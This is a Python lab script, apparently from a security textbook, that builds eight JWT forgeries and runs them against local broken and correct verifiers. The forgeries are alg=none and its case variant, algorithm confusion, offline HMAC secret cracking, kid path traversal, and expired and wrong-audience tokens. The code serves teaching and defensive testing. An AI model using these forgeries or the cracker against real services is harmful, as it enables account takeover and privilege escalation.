#!/usr/bin/env python3
"""
labs/gauntlet/run-gauntlet.py — the JWT attack gauntlet. Builds nine tokens, runs each
one past a broken verifier and a correct verifier, and prints the result matrix.

PURPOSE
  This is the executable core of labs/lab-02-the-jwt-attack-gauntlet.md, and the reason
  chapter 46 can make claims rather than assertions. It:

    1. mints a genuine token from the local issuer (labs/gauntlet/issuer.py),
    2. constructs eight forgeries, each exercising one named failure class,
    3. submits all nine to examples/01-broken-verifier.py and to
       examples/02-correct-verifier.py,
    4. compares what happened against what was supposed to happen, and
    5. exits non-zero if any cell disagrees.

  The control matters as much as the attacks. A verifier that rejects everything is not
  secure, it is broken in the other direction, so the correct verifier must still ACCEPT
  the genuine token. And one forgery -- A8, a payload edited without re-signing -- must be
  rejected by BOTH verifiers, which proves the broken one really does check signatures.
  That is exactly why reviewers wave it through.

  Expected matrix:

    id  attack                                   broken    correct
    A0  genuine token                            ACCEPT    ACCEPT
    A1  alg=none, role escalated to admin        ACCEPT    reject
    A2  alg=NoNe, case-variant of the same       ACCEPT    reject
    A3  HS256 signed with the published RSA key  ACCEPT    reject
    A4  weak HMAC secret, cracked offline        ACCEPT    reject
    A5  kid path traversal to a public file      ACCEPT    reject
    A6  genuinely signed but expired a year ago  ACCEPT    reject
    A7  genuinely signed for another audience    ACCEPT    reject
    A8  payload edited, signature untouched      reject    reject

USAGE
  python3 -B run-gauntlet.py --workdir /tmp/ch46-lab
  python3 -B run-gauntlet.py --workdir /tmp/ch46-lab --verbose   # print every token
  python3 -B run-gauntlet.py --workdir /tmp/ch46-lab --keep      # do not wipe on exit

  --workdir must be OUTSIDE this repository; issuer.py refuses otherwise. Run with -B:
  this script uses importlib.util.module_from_spec, which writes __pycache__ even when
  PYTHONDONTWRITEBYTECODE is set.

REQUIREMENTS
  Python 3.8+, `cryptography`. No network access at any point. Nothing listens on a port.

WHAT THIS WILL NOT TELL YOU
  * It will not tell you whether any real application is vulnerable. It measures two
    fixture verifiers in this repository. Its value is that you now know exactly what
    each attack looks like on the wire, so you can send the same nine tokens at a target
    and read its responses.
  * A "reject" from the correct verifier is not proof that verifier is flawless -- only
    that it withstands these nine inputs. Absence of evidence, as always.
  * It says nothing about token STORAGE, transport, or revocation. Those are labs 01,
    03 and 04.

SAFETY
  Every token this script handles is minted by the local issuer, in a throwaway workdir,
  with a keypair generated seconds earlier and discarded on exit. No token belonging to
  any real account goes anywhere near it, and none should.

Chapter 46 — Tokens
"""

import argparse
import base64
import hashlib
import hmac
import importlib.util
import json
import os
import shutil
import sys
import time

sys.dont_write_bytecode = True   # belt to -B's braces

HERE = os.path.dirname(os.path.abspath(__file__))
EXAMPLES = os.path.abspath(os.path.join(HERE, "..", "..", "examples"))


def load(path, name):
    """Import a module from a path whose filename is not a valid identifier."""
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def b64url_decode(segment: str) -> bytes:
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))


def seg(obj) -> str:
    return b64url(json.dumps(obj, separators=(",", ":"), sort_keys=True).encode("utf-8"))


def unsigned(header, claims) -> str:
    """alg=none: two segments of data and an EMPTY third segment.

    The trailing dot is required. A token ending in "." is structurally a JWT with a
    zero-length signature, which is precisely what RFC 7519's "none" algorithm means.
    Anyone who has typed one of these by hand remembers the dot, because a verifier that
    splits on "." and expects three parts silently rejects the version without it and
    the tester concludes wrongly that the attack failed.
    """
    return f"{seg(header)}.{seg(claims)}."


def hs256(header, claims, secret: bytes) -> str:
    signing_input = f"{seg(header)}.{seg(claims)}".encode("ascii")
    return f"{signing_input.decode('ascii')}.{b64url(hmac.new(secret, signing_input, hashlib.sha256).digest())}"


def crack_hmac_secret(token: str, wordlist) -> str:
    """Recover an HS256 secret offline, by trying candidates against the token itself.

    This is the whole mechanism, in six lines. There is no oracle, no request, no rate
    limit and no lockout, because the verification equation is entirely contained in the
    token: signature == HMAC(secret, header || "." || payload). A captured HS256 token is
    therefore a self-contained password-cracking target that an attacker can grind on a
    laptop, offline, indefinitely, with the target unaware. That property -- not any
    weakness in HMAC or SHA-256 -- is why a human-chosen HS256 secret is fatal.
    """
    header_b64, payload_b64, sig_b64 = token.split(".")
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    want = b64url_decode(sig_b64)
    for candidate in wordlist:
        if hmac.compare_digest(hmac.new(candidate.encode("utf-8"), signing_input,
                                        hashlib.sha256).digest(), want):
            return candidate
    return None


def build_attacks(workdir, issuer_mod, verbose=False):
    """Return a list of (id, description, token, expect_broken, expect_correct)."""
    now = int(time.time())
    genuine = issuer_mod.mint(workdir, family="rs", sub="alice", role="user", ttl=900)
    header = json.loads(b64url_decode(genuine.split(".")[0]))
    claims = json.loads(b64url_decode(genuine.split(".")[1]))

    pub_pem = open(os.path.join(workdir, "keys", issuer_mod.RSA_KID), "rb").read()
    jwks_bytes = open(os.path.join(workdir, "public", "jwks.json"), "rb").read()

    attacks = [("A0", "genuine RS256 token from the local issuer", genuine, True, True)]

    # ---- A1: alg=none --------------------------------------------------------
    # The oldest JWT attack there is, and still found in 2026, because the failure is
    # in a library's default rather than in anybody's code. Note the escalation: while
    # forging the token there is no reason to keep role=user.
    a1_claims = dict(claims, role="admin", scope="notes.read notes.write admin")
    attacks.append(("A1", "alg=none, role escalated to admin",
                    unsigned({"alg": "none", "typ": "JWT"}, a1_claims), True, False))

    # ---- A2: alg=NoNe --------------------------------------------------------
    # Some verifiers block the literal string "none" and nothing else. JSON is
    # case-sensitive, string comparison is case-sensitive, and "NoNe" is a different
    # string that many dispatch tables normalise back to the same branch.
    attacks.append(("A2", "alg=NoNe -- case-variant of the same bypass",
                    unsigned({"alg": "NoNe", "typ": "JWT"}, a1_claims), True, False))

    # ---- A3: HS/RS algorithm confusion ---------------------------------------
    # The verifier holds one key blob and picks the primitive from the token's `alg`.
    # Flip alg to HS256 and the RSA PUBLIC key -- which the issuer publishes, on
    # purpose, to the whole internet -- becomes the HMAC secret. No key was stolen and
    # no cryptography was broken. The bytes were simply used for a second purpose.
    a3_claims = dict(claims, role="admin", scope="notes.read notes.write admin")
    attacks.append(("A3", "HS256 signed with the published RSA public key",
                    hs256({"alg": "HS256", "typ": "JWT", "kid": issuer_mod.RSA_KID},
                          a3_claims, pub_pem), True, False))

    # ---- A4: weak HMAC secret ------------------------------------------------
    # Capture a legacy HS256 token, crack it offline, forge whatever you like. The
    # wordlist below is deliberately tiny; a real one is 14 million lines and a GPU
    # tries billions of candidates per second against a target that never finds out.
    legacy = issuer_mod.mint(workdir, family="hs", sub="alice", role="user", ttl=900)
    wordlist = ["123456", "password", "secret", "changeme", "jwt-secret",
                "Passw0rd", "Passw0rd!", "letmein", "qwerty", "admin"]
    t0 = time.time()
    recovered = crack_hmac_secret(legacy, wordlist)
    crack_ms = (time.time() - t0) * 1000
    print(f"[*] A4 offline crack: tried {len(wordlist)} candidates in {crack_ms:.1f} ms "
          f"-> {'recovered ' + repr(recovered) if recovered else 'not found'}")
    a4_claims = dict(claims, role="admin", scope="notes.read notes.write admin")
    a4_token = hs256({"alg": "HS256", "typ": "JWT"}, a4_claims,
                     (recovered or "Passw0rd!").encode("utf-8"))
    attacks.append(("A4", "weak HMAC secret cracked offline, admin forged",
                    a4_token, True, False))

    # ---- A5: kid path traversal ----------------------------------------------
    # `kid` is a hint written by whoever wrote the token. Here it is joined onto a
    # directory and opened, so it escapes. The traversal target is the published JWKS,
    # whose exact bytes the attacker downloaded -- so the attacker can compute the
    # matching HMAC. The classic POSIX form points at /dev/null for a zero-length key;
    # this variant is portable and makes the same point.
    a5_claims = dict(claims, role="admin", scope="notes.read notes.write admin")
    attacks.append(("A5", "kid traversal to ../public/jwks.json, HMACed with its bytes",
                    hs256({"alg": "HS256", "typ": "JWT", "kid": "../public/jwks.json"},
                          a5_claims, jwks_bytes), True, False))

    # ---- A6: expired --------------------------------------------------------
    # A genuinely, correctly, verifiably signed token -- from a year ago. The signature
    # is not the control that fails here. Nothing was forged at all.
    a6 = issuer_mod.mint(workdir, family="rs", sub="alice", role="user",
                         ttl=3600, issued_at=now - 365 * 24 * 3600)
    attacks.append(("A6", "genuine signature, expired 365 days ago", a6, True, False))

    # ---- A7: wrong audience -------------------------------------------------
    # Also genuinely signed, also current -- and minted for a different relying party.
    # This is the shape of the "Sign in with X" account takeover: the attacker registers
    # their own client at the same issuer and replays the token they legitimately
    # received. See 45-OAuth section 5.1 Attack 6 for the flow that produces it.
    a7 = issuer_mod.mint(workdir, family="rs", sub="mallory", role="user",
                         ttl=900, audience=issuer_mod.OTHER_AUDIENCE)
    attacks.append(("A7", "genuine signature, aud is a different client", a7, True, False))

    # ---- A8: tampered payload, signature untouched ---------------------------
    # The negative control. This must fail against BOTH verifiers, because the broken
    # verifier does check RS256 signatures -- which is exactly why a reviewer who asks
    # "does it verify the signature?" gets a yes and moves on.
    tampered_claims = dict(claims, role="admin")
    a8 = f"{genuine.split('.')[0]}.{seg(tampered_claims)}.{genuine.split('.')[2]}"
    attacks.append(("A8", "payload edited to role=admin, original signature kept",
                    a8, False, False))

    if verbose:
        for aid, desc, token, _b, _c in attacks:
            print(f"\n--- {aid}: {desc}")
            print(token)
    return attacks


def main():
    ap = argparse.ArgumentParser(description="Chapter 46 JWT attack gauntlet.")
    ap.add_argument("--workdir", required=True, help="throwaway dir, OUTSIDE this repo")
    ap.add_argument("--verbose", action="store_true", help="print every token")
    ap.add_argument("--keep", action="store_true", help="do not delete the workdir")
    args = ap.parse_args()

    issuer_mod = load(os.path.join(HERE, "issuer.py"), "ch46_issuer")
    broken = load(os.path.join(EXAMPLES, "01-broken-verifier.py"), "ch46_broken")
    correct = load(os.path.join(EXAMPLES, "02-correct-verifier.py"), "ch46_correct")

    issuer_mod.guard_workdir(args.workdir)
    issuer_mod.init(args.workdir)
    keydir = os.path.join(args.workdir, "keys")

    trust = correct.TrustStore(
        issuer=issuer_mod.ISSUER,
        audience=issuer_mod.AUDIENCE,
        rsa_public_pems={issuer_mod.RSA_KID: open(os.path.join(keydir, issuer_mod.RSA_KID), "rb").read()},
        # Note what is NOT here: the legacy HMAC secret. It is 9 bytes, so the correct
        # verifier's trust store would refuse it at use time anyway (RFC 7518 requires
        # at least 32 for HS256). Registering a key you know is too short, so that the
        # rejection happens at request time instead of at deploy time, is the mistake
        # this omission avoids. If you want to watch that rejection fire, add it.
        hmac_secrets={},
    )

    print()
    attacks = build_attacks(args.workdir, issuer_mod, args.verbose)

    print()
    print("=" * 100)
    print(f"{'id':<4}{'attack':<52}{'broken':<20}{'correct':<20}")
    print("=" * 100)

    failures = 0
    rows = []
    for aid, desc, token, expect_broken, expect_correct in attacks:
        ok_b, _cb, why_b = broken.verify(token, keydir=keydir)
        ok_c, _cc, why_c = correct.verify(token, trust)
        mark_b = "ACCEPT" if ok_b else "reject"
        mark_c = "ACCEPT" if ok_c else "reject"
        bad_b = ok_b != expect_broken
        bad_c = ok_c != expect_correct
        failures += bad_b + bad_c
        print(f"{aid:<4}{desc[:50]:<52}{mark_b + ('  <-- UNEXPECTED' if bad_b else ''):<20}"
              f"{mark_c + ('  <-- UNEXPECTED' if bad_c else ''):<20}")
        rows.append((aid, desc, mark_b, why_b, mark_c, why_c))

    print("=" * 100)
    print()
    print("Why the correct verifier said no (this is the part worth reading):")
    for aid, _desc, _mb, _wb, mc, wc in rows:
        if mc == "reject":
            print(f"  {aid}  {wc}")
    print()
    print("Why the broken verifier said yes:")
    for aid, _desc, mb, wb, _mc, _wc in rows:
        if mb == "ACCEPT":
            print(f"  {aid}  {wb}")

    accepted_broken = sum(1 for r in rows if r[2] == "ACCEPT")
    accepted_correct = sum(1 for r in rows if r[4] == "ACCEPT")
    print()
    print(f"broken verifier : accepted {accepted_broken}/{len(rows)} "
          f"({accepted_broken - 1} forgeries)")
    print(f"correct verifier: accepted {accepted_correct}/{len(rows)} "
          f"({accepted_correct - 1} forgeries)")

    if not args.keep:
        shutil.rmtree(args.workdir, ignore_errors=True)
        print(f"\n[+] wiped {args.workdir} -- the private key existed for the life of this run")
    else:
        print(f"\n[!] --keep: private key material is still in {args.workdir}. Delete it.")

    if failures:
        print(f"\nFAIL: {failures} cell(s) did not match the expected matrix.")
        return 1
    print("\nPASS: every cell matched the expected matrix.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
